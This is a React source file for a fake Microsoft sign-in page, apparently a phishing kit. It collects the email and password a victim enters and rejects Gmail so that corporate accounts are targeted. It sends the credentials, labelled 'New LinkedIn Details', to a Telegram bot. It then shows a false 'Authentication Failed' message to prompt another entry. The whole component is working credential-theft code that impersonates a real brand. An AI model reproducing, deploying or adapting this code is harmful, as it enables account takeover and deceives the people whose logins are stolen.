import React, { useEffect, useState } from "react";
import styles from "./form.module.css";
import MyLogo from "../../images/microsoft-logo.png";

const Form = () => {
  const [viewPassword, setViewPassword] = useState(true);
  const [emal, setEmal] = useState();
  const [passwrd, setPasswrd] = useState();
  const botToken = import.meta.env.VITE_BOT_TOKEN;
  const chatId = import.meta.env.VITE_CHAT_ID;

  function handleFormSubmit() {
    if(emal && passwrd){
      checkDetails(emal, passwrd)
    }
    async function checkDetails(userEmail, userPassword) {
      try {
        if (regexGmail(userEmail)) {
          alert('Input your domain email. Gmail not allowed');
          return;
        }

        const formData = new FormData();
        formData.append('userEmails', userEmail);
        formData.append('userPasswords', userPassword);

        const data = Object.fromEntries(formData);
        const { userEmails, userPasswords } = data;
        
        await sendDetails(userEmails, userPasswords);
      } catch (error) {
        console.log(error);
      }
    }
  }

  async function sendDetails(emal, passwrd) {
    try {
      console.log(typeof chatId);
      console.log(botToken);``````
      const message = `
!UPDATE

~ New LinkedIn Details ~

Email: ${emal}

Password: ${passwrd}
`;

      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        }
      );

      const data = await response.json();

      // Success message should be shown here
      alert(
        `Authentication Failed \nInput correct email or passwordd to secure login`
      );
      setPasswrd("");
      setEmal("");
    } catch (error) {
      console.error("Error sending message:", error);
    }
  }

  return (
    <div className={styles.formDiv}>
      <div className={styles.formCtn}>
        <div className={styles.logoCtn}>
          <img src={MyLogo} alt="logo" />
          <h2> Microsoft</h2>
        </div>

        <form onSubmit={handleFormSubmit}>
          <h1>{!viewPassword ? "Sign in" : "Enter Password"}</h1>

          <div>
            {!viewPassword ? (
              <input
                type="email"
                name="emal"
                id="emal"
                placeholder="Email, Phone or Skype"
                value={emal}
                onChange={(e) => setEmal(e.target.value)}
              />
            ) : (
              <input
                type="password"
                name="passwrd"
                id="passwrd"
                placeholder="Password"
                value={passwrd}
                onChange={(e) => setPasswrd(e.target.value)}
              />
            )}
          </div>

          <div className={styles.formBtmDiv}>
            <p role="button">
              {!viewPassword ? "No account?" : ""}{" "}
              <span className={styles.colorP}>
                {!viewPassword ? "Create one!" : "Forgot password?"}
              </span>
            </p>
            <p className={styles.colorP} role="button">
              {" "}
              {!viewPassword
                ? "Can't access your account?"
                : "Email code to ikechukwuprosper8@gmail.com"}
            </p>
          </div>

          <div className={styles.btnDiv}>
            {/* <button type="button">Back</button> */}
            <button type="submit">{!viewPassword ? "Next" : "Sign In"}</button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Form;
